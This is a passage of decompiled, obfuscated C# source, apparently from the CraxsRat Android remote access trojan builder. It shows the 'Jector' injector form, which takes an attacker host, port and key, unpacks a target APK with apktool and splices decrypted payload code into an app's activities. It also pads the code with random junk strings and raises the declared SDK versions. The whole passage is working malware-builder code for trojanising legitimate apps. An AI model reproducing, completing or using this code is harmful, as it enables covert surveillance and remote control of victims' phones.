                        case 9:
                          contents[checked (index + 1)] = contents[checked (index + 1)] + Environment.NewLine + this.D(Craxs_Rat.My.Resources.Resources.oncreatecode).Replace(this.D(EXGuarder.\u00368523735), newValue);
                          contents[checked (contents.Length - 1)] = contents[checked (contents.Length - 1)] + Environment.NewLine + Environment.NewLine + this.D(this.Decrypt(Craxs_Rat.My.Resources.Resources.MainMith, ((NotificationMaker) this).TK)).Replace(this.D(EXGuarder.\u00368523735), newValue).Replace(EXGuarder.\u003554A166C, ((KeyboardManager) this).N_ClassGen + EXGuarder.\u0035E253817).Replace(EXGuarder.\u0035E550E6A, ((KeyboardManager) this).N_ClassGen);
                          num114 = -305315283;
                          continue;
                        case 10:
                          num114 = (int) num116 * -1065210424 ^ 752937725;
                          continue;
                        case 11:
                          File.WriteAllLines(path, contents);
                          num114 = 1433821277;
                          continue;
                        case 12:
                          num117 = checked (contents.Length - 1);
                          index = 0;
                          num114 = (int) num116 * -246828494 ^ -47646725;
                          continue;
                        case 13:
                          newValue = strArray[checked (strArray.Length - 1)];
                          num114 = (int) num116 * -1199975494 ^ 2127362582;
                          continue;
                        default:
                          goto label_305;
                      }
                    }
                  }
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
label_305:
                checked { ++num87; }
                goto case 1;
            }
          }
        }
        finally
        {
          if (enumerator1 is IDisposable)
          {
label_308:
            int num122 = -536003205;
            while (true)
            {
              int num123 = num122;
              uint num124;
              switch ((num124 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num123 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 3U)
              {
                case 1:
                  (enumerator1 as IDisposable).Dispose();
                  num122 = (int) num124 * 998655019 ^ 910438793;
                  continue;
                case 2:
                  goto label_308;
                default:
                  goto label_312;
              }
            }
          }
label_312:;
        }
      }
label_313:
      if (!this.CheckAutomatic.Checked)
        goto label_317;
label_314:
      int num125 = -1600890512;
label_315:
      while (true)
      {
        int num126 = num125;
        uint num127;
        string path;
        switch ((num127 = (uint) ((-919587533 - 309020377 ^ ~1047244339) - (num126 * 1998748153 - ((-433458467 ^ 1314572407 * (1393620019 - -1789381303)) + ((-1266397477 ^ -1282283495) * 1460885515 ^ ~855266267 + --1831318971))) * -1491628755)) % 10U)
        {
          case 0:
            goto label_314;
          case 1:
            int num128 = Directory.Exists(path) ? -1889044685 : (num128 = -1438625176);
            num125 = num128 ^ (int) num127 * 2057293424;
            continue;
          case 2:
            num125 = (int) num127 * 230638173 ^ 385902619;
            continue;
          case 3:
            ((PermissionsManager) this).outputapk = path + EXGuarder.\u0036A72453C;
            num125 = (int) num127 * 2040205957 ^ -423745250;
            continue;
          case 4:
            Directory.CreateDirectory(path);
            num125 = (int) num127 * -1812114062 ^ 1571639911;
            continue;
          case 5:
            goto label_317;
          case 6:
            this.log.AppendText(Environment.NewLine + EXGuarder.\u0034F2B772D + Environment.NewLine + EXGuarder.\u003370A1814);
            num125 = (int) num127 * 2087321956 ^ 1428143036;
            continue;
          case 7:
            goto label_316;
          case 8:
            path = ((PermissionsManager) this).WorkingDir + EXGuarder.\u00368092959;
            num125 = (int) num127 * -1578994709 ^ 1977103407;
            continue;
          case 9:
            this.ExecuteCommand(EXGuarder.\u0035C075C58 + ((PermissionsManager) this).apktoolpath + EXGuarder.\u0030A676A1C + this.TheApkPath + EXGuarder.\u0032B4B6106 + ((PermissionsManager) this).outputapk);
            num125 = 1600849394;
            continue;
          default:
            goto label_303;
        }
      }
label_316:
      return;
label_303:
      return;
label_317:
      this.log.AppendText(Environment.NewLine + EXGuarder.\u0034F2B772D + Environment.NewLine + EXGuarder.\u00367067129);
      num125 = -1735913621;
      goto label_315;
label_15:
      this.log.AppendText(Environment.NewLine + EXGuarder.\u0030F704D6D);
      num7 = -1371956570;
      goto label_12;
    }

    public string Decrypt(string text, string password)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
label_1:
      int num1 = 405440115;
      string str1;
      while (true)
      {
        int num2 = num1;
        uint num3;
        byte[] hash;
        byte[] destinationArray;
        string str2;
        MD5CryptoServiceProvider cryptoServiceProvider;
        switch ((num3 = (uint) ~(211174788 - (num2 * -1620231059 + -2143253827 * (~1517034741 + -(-1998823091 * -808245342))))) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            str1 = str2;
            num1 = (int) num3 * 406018020 ^ -786231011;
            continue;
          case 2:
            Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
            rijndaelManaged.Key = destinationArray;
            num1 = (int) num3 * -472425689 ^ 237572740;
            continue;
          case 3:
            destinationArray = new byte[32];
            hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(password));
            num1 = (int) num3 * -625501879 ^ -696364622;
            continue;
          case 4:
            Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
            num1 = (int) num3 * 2034686152 ^ 2042698760;
            continue;
          case 5:
            rijndaelManaged.Mode = CipherMode.ECB;
            num1 = (int) num3 * -2029834104 ^ 1497248603;
            continue;
          case 6:
            ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
            byte[] inputBuffer = Convert.FromBase64String(text);
            str2 = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
            num1 = (int) num3 * 1399454932 ^ 27121562;
            continue;
          case 7:
            cryptoServiceProvider = new MD5CryptoServiceProvider();
            string str3 = EXGuarder.\u00331313D11;
            num1 = (int) num3 * 1287324622 ^ -355006841;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str1;
    }

    public string madladstr()
    {
      return Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(this.RandomShit(400, 1000), (object) EXGuarder.\u0032F0C3705), this.RandommMad(400, 1000)), (object) EXGuarder.\u0032F0C3705), this.RandomShit(400, 1000)), (object) EXGuarder.\u0032F0C3705), this.RandommMad(400, 1000)));
    }

    public object RandommMad(int minCharacters, int maxCharacters)
    {
      string str1 = EXGuarder.\u0033F746429;
      if (((PermissionsManager) this).rshit != null)
        goto label_7;
label_1:
      int num1 = -608637939;
label_2:
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-(~num1 ^ -(1086071671 + ~(1570603629 + 340525090))) * 885207759 + (212845135 ^ 1751953764)) * -1034084707)) % 8U)
        {
          case 0:
            goto label_7;
          case 1:
            // ISSUE: variable of a reference type
            int& local;
            // ISSUE: explicit reference operation
            int num3 = checked (^(local = ref ((PermissionsManager) this).cou3) + 1);
            local = num3;
            num1 = (int) num2 * 246209040 ^ 32083878;
            continue;
          case 2:
            num1 = (int) num2 * 1327199239 ^ -211133354;
            continue;
          case 3:
            str2 += Conversions.ToString(str1[((PermissionsManager) this).rshit.Next(0, checked (str1.Length - 1))]);
            num1 = 1574219320;
            continue;
          case 4:
            goto label_1;
          case 5:
            int num4;
            num1 = num4 = str2.Length < minCharacters ? 1523601498 : (num4 = -1567610620);
            continue;
          case 6:
            ((PermissionsManager) this).rshit = new Random();
            num1 = (int) num2 * -1938705001 ^ 1880830585;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return (object) (str2.ToString().ToLower() + Conversions.ToString(((PermissionsManager) this).cou3));
label_7:
      str2 = EXGuarder.\u00350191709;
      num1 = 592359785;
      goto label_2;
    }

    public object CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq(int minCharacters, int maxCharacters)
    {
      string str = EXGuarder.\u0036D5C6578;
label_1:
      int num1 = 690201078;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (((979191199 - 1569782259 - ((731798126 ^ 1493354823) + (1341459494 ^ -850728239)) + (-1064903427 ^ 1436733825 * (-1932010857 ^ -1293270309)) - (num2 ^ -(926411045 ^ 976431001) + (-1518899298 - -1409040207 - 1149680413 * 2081651072) - ~((-160598380 ^ 1679413155) - -1924902578 * -1362141707) + (--614969292 ^ -876576020)) ^ ~388998724) * -695514111 - (820214335 ^ 619535585)) * -1780053143)) % 4U)
        {
          case 1:
            int num4 = ((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init != null ? 731916936 : (num4 = 319543934);
            num1 = num4 ^ (int) num3 * 1808819983;
            continue;
          case 2:
            Interlocked.CompareExchange<StaticLocalInitFlag>(ref ((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init, new StaticLocalInitFlag(), (StaticLocalInitFlag) null);
            num1 = (int) num3 * 1944145466 ^ 1328907271;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      bool flag = false;
      try
      {
        Monitor.Enter((object) ((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init, ref flag);
        if (((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init.State != (short) 0)
          goto label_9;
label_7:
        int num5 = -992840962;
label_8:
        while (true)
        {
          int num6 = num5;
          uint num7;
          switch ((num7 = (uint) (((979191199 - 1569782259 - ((731798126 ^ 1493354823) + (1341459494 ^ -850728239)) + (-1064903427 ^ 1436733825 * (-1932010857 ^ -1293270309)) - (num6 ^ -(926411045 ^ 976431001) + (-1518899298 - -1409040207 - 1149680413 * 2081651072) - ~((-160598380 ^ 1679413155) - -1924902578 * -1362141707) + (--614969292 ^ -876576020)) ^ ~388998724) * -695514111 - (820214335 ^ 619535585)) * -1780053143)) % 7U)
          {
            case 0:
              ((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r = new Random();
              num5 = (int) num7 * -541002665 ^ -1245717585;
              continue;
            case 2:
              goto label_9;
            case 3:
              goto label_7;
            case 4:
              num5 = (int) num7 * -2097817096 ^ -1077184148;
              continue;
            case 5:
              goto label_11;
            case 6:
              ((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init.State = (short) 2;
              num5 = (int) num7 * 1293487747 ^ 245907386;
              continue;
            default:
              goto label_20;
          }
        }
label_11:
        throw new IncompleteInitialization();
label_9:
        num5 = ((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init.State != (short) 2 ? 1471316668 : (num5 = -523754704);
        goto label_8;
      }
      finally
      {
        ((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init.State = (short) 1;
label_15:
        int num8 = -1199187922;
        while (true)
        {
          int num9 = num8;
          uint num10;
          switch ((num10 = (uint) (((979191199 - 1569782259 - ((731798126 ^ 1493354823) + (1341459494 ^ -850728239)) + (-1064903427 ^ 1436733825 * (-1932010857 ^ -1293270309)) - (num9 ^ -(926411045 ^ 976431001) + (-1518899298 - -1409040207 - 1149680413 * 2081651072) - ~((-160598380 ^ 1679413155) - -1924902578 * -1362141707) + (--614969292 ^ -876576020)) ^ ~388998724) * -695514111 - (820214335 ^ 619535585)) * -1780053143)) % 4U)
          {
            case 0:
              Monitor.Exit((object) ((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r\u0024Init);
              num8 = (int) num10 * 1867143673 ^ 1391668908;
              continue;
            case 1:
              int num11 = !flag ? -1405409669 : (num11 = 1197870700);
              num8 = num11 ^ (int) num10 * -1052291077;
              continue;
            case 2:
              goto label_15;
            default:
              goto label_19;
          }
        }
label_19:;
      }
label_20:
      int num12 = ((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r.Next(minCharacters, maxCharacters);
label_21:
      int num13 = -1827494886;
      object obj;
      while (true)
      {
        int num14 = num13;
        uint num15;
        StringBuilder stringBuilder;
        int num16;
        int num17;
        switch ((num15 = (uint) (((979191199 - 1569782259 - ((731798126 ^ 1493354823) + (1341459494 ^ -850728239)) + (-1064903427 ^ 1436733825 * (-1932010857 ^ -1293270309)) - (num14 ^ -(926411045 ^ 976431001) + (-1518899298 - -1409040207 - 1149680413 * 2081651072) - ~((-160598380 ^ 1679413155) - -1924902578 * -1362141707) + (--614969292 ^ -876576020)) ^ ~388998724) * -695514111 - (820214335 ^ 619535585)) * -1780053143)) % 8U)
        {
          case 0:
            int num18;
            num13 = num18 = num16 <= num17 ? -665552635 : (num18 = 1311852412);
            continue;
          case 1:
            stringBuilder = new StringBuilder();
            num13 = (int) num15 * 1069447538 ^ 794305226;
            continue;
          case 2:
            goto label_21;
          case 3:
            num17 = num12;
            num13 = (int) num15 * 456084236 ^ 859502106;
            continue;
          case 5:
            num16 = 1;
            num13 = (int) num15 * -1883793407 ^ 1828148998;
            continue;
          case 6:
            int startIndex = ((PermissionsManager) this).\u0024STATIC\u0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq\u00242021C88\u0024r.Next(0, str.Length);
            stringBuilder.Append(str.Substring(startIndex, 1));
            checked { ++num16; }
            num13 = -390981309;
            continue;
          case 7:
            obj = (object) stringBuilder.ToString();
            num13 = (int) num15 * 858517404 ^ -3923829;
            continue;
          default:
            goto label_29;
        }
      }
label_29:
      return obj;
    }

    private bool CheckAllValuse()
    {
      if ((object) this.Host.Text == (object) EXGuarder.\u00322454F07)
        goto label_4;
label_1:
      int num1 = -492560161;
label_2:
      bool flag;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-(-(835573265 * ~~1319777405) - num2 * 780956549) - ((-1878316494 ^ -288047613) - (-435759624 - 904299807)))) % 12U)
        {
          case 0:
            int num4 = (object) this.TheKey.Text == (object) EXGuarder.\u00322454F07 ? -20648279 : (num4 = -424111504);
            num1 = num4 ^ (int) num3 * 778739742;
            continue;
          case 1:
            int num5;
            num1 = num5 = (object) this.FolderPath.Text == (object) EXGuarder.\u00322454F07 ? -568784815 : (num5 = 68454901);
            continue;
          case 2:
            goto label_4;
          case 4:
            flag = true;
            num1 = (int) num3 * 530254423 ^ -1797759479;
            continue;
          case 5:
            int num6 = !this.CheckAutomatic.Checked ? 684295298 : (num6 = 1313836940);
            num1 = num6 ^ (int) num3 * 257570690;
            continue;
          case 6:
            int num7 = this.Activlist.Items.Count <= 0 ? 1784995637 : (num7 = 665293515);
            num1 = num7 ^ (int) num3 * -171527154;
            continue;
          case 7:
            int num8 = (object) this.TargetApktext.Text == (object) EXGuarder.\u00322454F07 ? 1214290599 : (num8 = 1401694206);
            num1 = num8 ^ (int) num3 * 379260498;
            continue;
          case 8:
            int num9 = (object) this.Port.Text == (object) EXGuarder.\u00322454F07 ? -1889377311 : (num9 = -188791309);
            num1 = num9 ^ (int) num3 * -1132174185;
            continue;
          case 9:
            flag = true;
            num1 = (int) num3 * 1286709090 ^ -1699434972;
            continue;
          case 10:
            num1 = (int) num3 * 408556050 ^ 1104059546;
            continue;
          case 11:
            goto label_1;
          default:
            goto label_13;
        }
      }
label_13:
      return flag;
label_4:
      flag = false;
      num1 = -1606621122;
      goto label_2;
    }

    private void Port_TextChanged(object sender, EventArgs e)
    {
      try
      {
        if (Operators.CompareString(this.Port.Text, EXGuarder.\u0032D2E6B0A, false) == 0)
          return;
label_1:
        int num1 = 1978202675;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 - (-((198587372 - -1822809438 ^ -814941252 - -1321905316) * -1426700371) + (((1176000122 - -300337326) * 1069607269 ^ -591795836) + ~(897146449 + 835957273 + ~-1758405897))) ^ -(~(670521335 - -542084224) + (1756948793 - 1716831716 ^ 181122731))) * -1530821525 * -1749264461 - -440347203 * 843365397 ^ 45387838)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Port.Text = EXGuarder.\u0032D2E6B0A;
              int num3 = (int) Interaction.MsgBox((object) EXGuarder.\u00378786563);
              num1 = (int) num2 * 131525189 ^ -2002060085;
              continue;
            case 2:
              goto label_7;
            case 3:
              int num4 = Versioned.IsNumeric((object) this.Port.Text) ? 1889294004 : (num4 = -13387813);
              num1 = num4 ^ (int) num2 * 633164130;
              continue;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams1 = base.CreateParams;
label_1:
        int num1 = -604618760;
        CreateParams createParams2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (---~num1 - --957634921 ^ -1200661738)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              createParams2 = createParams1;
              num1 = (int) num2 * -32862876 ^ 2022862545;
              continue;
            case 2:
              createParams1.ExStyle |= 128;
              num1 = (int) num2 * -492809630 ^ -1114178597;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return createParams2;
      }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
      try
      {
        // ISSUE: reference to a compiler-generated method
        MySettings.get_Settings().inj_tnam = this.CLiname.Text;
label_1:
        int num1 = 1358616556;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~(-76305909 - ~~num2)) % 5U)
          {
            case 0:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().inj_tkey = this.TheKey.Text;
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().Save();
              num1 = (int) num3 * 925868599 ^ 24049359;
              continue;
            case 1:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().inj_tport = this.Port.Text;
              num1 = (int) num3 * 1325561633 ^ 1608053322;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            case 4:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().inj_thost = this.Host.Text;
              num1 = (int) num3 * 207722575 ^ -1372152571;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public string UpdateVersions(string inputXml)
    {
      XmlDocument xmlDocument = new XmlDocument();
label_1:
      int num1 = 394891967;
      string outerXml;
      while (true)
      {
        int num2 = num1;
        uint num3;
        XmlAttribute attribute1;
        int result1;
        XmlAttribute attribute2;
        int result2;
        XmlNode xmlNode;
        switch ((num3 = (uint) (-226362964 - (-978295895 * 1861010516 + (-1422218275 ^ 2118760703) - ((num2 - (~(-(2012638377 * -1813600397) * -1011120241) ^ (~-2047322948 ^ 764358610 - -345582590 + (1576732808 ^ 809194287)) + (-685736965 ^ -1019445860 * 912224721 ^ -1857229811))) * 2094800395 ^ -18128945 * -1292843900 - (-726345280 - 585324861 + ~-81850281)) - (-227757578 - -577248664)))) % 15U)
        {
          case 0:
            int num4;
            num1 = num4 = attribute2 == null ? 1840643122 : (num4 = -2063522359);
            continue;
          case 1:
            xmlNode = xmlDocument.SelectSingleNode(EXGuarder.\u00364342D01);
            int num5 = xmlNode == null ? -2082651207 : (num5 = -2029575118);
            num1 = num5 ^ (int) num3 * -1213783187;
            continue;
          case 2:
            attribute1.Value = EXGuarder.\u0037371150D;
            num1 = (int) num3 * -487643171 ^ 499995895;
            continue;
          case 3:
            attribute1 = xmlNode.Attributes[EXGuarder.\u00338615C19];
            num1 = (int) num3 * -373532084 ^ -1856769821;
            continue;
          case 5:
            attribute2.Value = EXGuarder.\u0037371150D;
            num1 = (int) num3 * 1029662504 ^ -1725981190;
            continue;
          case 6:
            outerXml = xmlDocument.OuterXml;
            num1 = 812933562;
            continue;
          case 7:
            int num6 = attribute1 == null ? 524054762 : (num6 = -807531428);
            num1 = num6 ^ (int) num3 * 1991547102;
            continue;
          case 8:
            attribute2 = xmlNode.Attributes[EXGuarder.\u0033C4F392D];
            num1 = (int) num3 * 1525803710 ^ -907072885;
            continue;
          case 9:
            int num7 = !int.TryParse(attribute2.Value, out result2) ? -378933846 : (num7 = 1826392088);
            num1 = num7 ^ (int) num3 * -872777707;
            continue;
          case 10:
            int num8 = result2 <= 29 ? -480147079 : (num8 = 1320000737);
            num1 = num8 ^ (int) num3 * 1020206061;
            continue;
          case 11:
            int num9 = result1 <= 29 ? 276826044 : (num9 = -806904592);
            num1 = num9 ^ (int) num3 * 1750448341;
            continue;
          case 12:
            int num10 = !int.TryParse(attribute1.Value, out result1) ? 1225524272 : (num10 = -331936639);
            num1 = num10 ^ (int) num3 * 694974042;
            continue;
          case 13:
            goto label_1;
          case 14:
            xmlDocument.LoadXml(inputXml);
            num1 = (int) num3 * -1117915981 ^ -750106850;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return outerXml;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Translateme();
      try
      {
        // ISSUE: reference to a compiler-generated method
        this.CLiname.Text = MySettings.get_Settings().inj_tnam;
label_2:
        int num1 = 540803337;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -((num1 ^ ~~(449267974 - -2015555073 - (-1550979903 ^ 2037999240) - (-2042961672 - -339892287))) - (-502437675 * ~~286202663 - (~1599474848 * -187153117 - 1888647346 * -277069057 * -2002831281)))) % 5U)
          {
            case 0:
              goto label_2;
            case 1:
              // ISSUE: reference to a compiler-generated method
              this.Host.Text = MySettings.get_Settings().inj_thost;
              num1 = (int) num2 * -644061016 ^ -839065028;
              continue;
            case 2:
              // ISSUE: reference to a compiler-generated method
              this.TheKey.Text = MySettings.get_Settings().inj_tkey;
              num1 = (int) num2 * 821363804 ^ 194889798;
              continue;
            case 3:
              goto label_16;
            case 4:
              // ISSUE: reference to a compiler-generated method
              this.Port.Text = MySettings.get_Settings().inj_tport;
              num1 = (int) num2 * -2106091803 ^ 1875951569;
              continue;
            default:
              goto label_12;
          }
        }
label_16:
        return;
label_12:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.CLiname.Text = EXGuarder.\u0035261773B;
label_10:
        int num3 = -1685245073;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) -((num3 ^ ~~(449267974 - -2015555073 - (-1550979903 ^ 2037999240) - (-2042961672 - -339892287))) - (-502437675 * ~~286202663 - (~1599474848 * -187153117 - 1888647346 * -277069057 * -2002831281)))) % 5U)
          {
            case 0:
              goto label_8;
            case 1:
              this.Host.Text = EXGuarder.\u003655F4F75;
              this.Port.Text = EXGuarder.\u00324366946;
              num3 = (int) num4 * -1263517606 ^ -1281257267;
              continue;
            case 2:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * -638206989 ^ 1010717595;
              continue;
            case 3:
              goto label_10;
            case 4:
              this.TheKey.Text = EXGuarder.\u00302714409;
              num3 = (int) num4 * 941691058 ^ -346101968;
              continue;
            default:
              goto label_4;
          }
        }
label_8:
        return;
label_4:;
      }
    }

    private void Button4_Click_1(object sender, EventArgs e)
    {
    }

    private void DrakeUIAvatar1_Click(object sender, EventArgs e) => this.Close();

    [DllImport("user32")]
    public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

    [DllImport("user32.dll")]
    public static extern bool ReleaseCapture();

    private void DrakeUITitlePanel1_MouseDown(object sender, MouseEventArgs e)
    {
    }

    private void DrakeUITitlePanel2_Click(object sender, EventArgs e)
    {
      try
      {
        Process.Start(EXGuarder.\u00359706677);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Panel3_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 139439966;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(num1 + (1496507806 - (761913866 - 311077964) - -(-669497353 * -2056743383 - (1379814281 - -1793506158) ^ ~-851264727 + (-1237533440 ^ -1163009954))) - ~((833929315 * 1958300105 ^ 810796123 * -1906123145) * 240854077)) - -1126957891)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            Jector.ReleaseCapture();
            Jector.SendMessage(this.Handle, PermissionsManager.WM_NCLBUTTONDOWN, PermissionsManager.HT_CAPTION, 0);
            num1 = (int) num2 * 116540456 ^ -1022736081;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void Removeactiv_Click(object sender, EventArgs e)
    {
      if (this.Activlist.Items.Count <= 0)
        goto label_6;
label_1:
      int num1 = -898917322;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(-(num1 ^ ~((--2047531141 - (-1160624424 ^ 271545524)) * -1203424489) - ~(--1984838830 - 679627752) ^ -992126199 ^ (324210260 - 1069390423) * -2130354663 ^ -891050631) ^ 1900993935 + 691975757)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.Activlist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Activlist.SelectedItem));
            num1 = (int) num2 * 15238494 ^ -1348755213;
            continue;
          case 3:
            CraxsAlert.Showinformation(EXGuarder.\u00334744F39);
            num1 = -1097377982;
            continue;
          case 4:
            int num3 = this.Activlist.SelectedItem == null ? 1925992590 : (num3 = 1009470023);
            num1 = num3 ^ (int) num2 * -1693617707;
            continue;
          case 5:
            num1 = (int) num2 * 876062346 ^ 1733448732;
            continue;
          case 6:
            goto label_6;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:
      return;
label_6:
      CraxsAlert.Showinformation(EXGuarder.\u0030E710C5C);
      num1 = -1097377982;
      goto label_2;
    }

    private void CheckAutomatic_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.CheckAutomatic.Checked)
        goto label_8;
label_1:
      int num1 = -1275155231;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 - -((-(1982912635 ^ 128370169) ^ --1768625590 - 2020717256) - (---1562126325 - 1749665571))) * -1282531407 + (-2114022938 + --1058862832 - 74166140) - --1720722469 * -820266991)) % 14U)
        {
          case 0:
            goto label_3;
          case 1:
            this.TargetApktext.Enabled = false;
            this.selectapkbtn.Enabled = false;
            this.labeltargetapp.Enabled = false;
            num1 = (int) num2 * -718843064 ^ -176591138;
            continue;
          case 2:
            this.checkprotector.Enabled = false;
            num1 = (int) num2 * 75072913 ^ 1062669275;
            continue;
          case 3:
            this.labeltargetapp.Enabled = true;
            this.checkonlymain.Enabled = true;
            this.checkprotector.Enabled = true;
            num1 = (int) num2 * -1107915999 ^ 827555500;
            continue;
          case 4:
            this.addactiv.Enabled = true;
            this.removeactiv.Enabled = true;
            this.Label6.Enabled = true;
            num1 = (int) num2 * 254189266 ^ -696198056;
            continue;
          case 5:
            this.addactiv.Enabled = false;
            this.removeactiv.Enabled = false;
            this.panelactivitys.Enabled = false;
            num1 = (int) num2 * 2121721606 ^ -484055153;
            continue;
          case 6:
            goto label_1;
          case 7:
            this.paneltargetfolder.Enabled = true;
            num1 = (int) num2 * 80364593 ^ 739264092;
            continue;
          case 8:
            this.paneltargetfolder.Enabled = false;
            num1 = (int) num2 * -1697871873 ^ -350746162;
            continue;
          case 9:
            this.selectapkbtn.Enabled = true;
            num1 = (int) num2 * 1034281153 ^ -2124355;
            continue;
          case 10:
            goto label_8;
          case 11:
            this.checkonlymain.Enabled = false;
            num1 = (int) num2 * 1364654201 ^ -1494532654;
            continue;
          case 12:
            this.Label6.Enabled = false;
            num1 = (int) num2 * 340114375 ^ 1840156674;
            continue;
          case 13:
            this.TargetApktext.Enabled = true;
            num1 = (int) num2 * -1554435577 ^ 998861151;
            continue;
          default:
            goto label_16;
        }
      }
label_3:
      return;
label_16:
      return;
label_8:
      this.panelactivitys.Enabled = true;
      num1 = -128485686;
      goto label_2;
    }

    private void Selectapkbtn_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.InitialDirectory = EXGuarder.\u003636C6D41;
label_1:
      int num1 = 1569839524;
      while (true)
      {
        int num2 = num1;
        uint num3;
        DialogResult dialogResult;
        switch ((num3 = (uint) (-1978550056 - ~(--(num2 + (~~-(-1447253766 ^ 2066307419) + -360602829)) - (-1145314873 - 925684971 + -1270235893 * 1856799635)))) % 9U)
        {
          case 0:
            goto label_3;
          case 1:
            openFileDialog.Title = EXGuarder.\u003176D6329;
            num1 = (int) num3 * 77151884 ^ 355735346;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num3 * 167641981 ^ -1828446678;
            continue;
          case 4:
            int num4 = dialogResult == DialogResult.OK ? -1564197134 : (num4 = 141869157);
            num1 = num4 ^ (int) num3 * -165705864;
            continue;
          case 5:
            this.TargetApktext.Text = EXGuarder.\u0033B3F7323;
            num1 = (int) num3 * 245814567 ^ 1542794957;
            continue;
          case 6:
            this.TargetApktext.Text = openFileDialog.FileName;
            num1 = -4692108;
            continue;
          case 7:
            dialogResult = openFileDialog.ShowDialog();
            num1 = (int) num3 * 591174703 ^ -21686468;
            continue;
          case 8:
            openFileDialog.Filter = EXGuarder.\u0035369040E;
            num1 = (int) num3 * 1023539233 ^ 390002000;
            continue;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:;
    }

    public Jector(Jector._Closure\u0024__287\u002D0 arg0)
    {
      if (arg0 == null)
        return;
